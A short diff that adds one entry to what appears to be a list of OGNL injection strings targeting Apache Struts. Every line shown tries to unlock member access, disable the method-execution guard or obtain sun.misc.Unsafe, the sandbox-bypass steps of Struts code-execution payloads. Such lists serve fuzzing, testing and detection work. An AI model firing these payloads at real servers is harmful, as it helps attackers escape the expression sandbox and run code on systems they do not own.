@@ -46,3 +46,4 @@
 %{#_memberAccess.a=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
 %{(@sun.misc.Unsafe@getUnsafe()).(#_memberAccess.allowStaticMethodAccess=true).(#context["xwork.MethodAccessor.denyMethodExecution"]=false)}
 %{#_memberAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
+%{(@sun.misc.Unsafe@getUnsafe()).(#_memberAccess.a=true).(#context["a"]=false)}
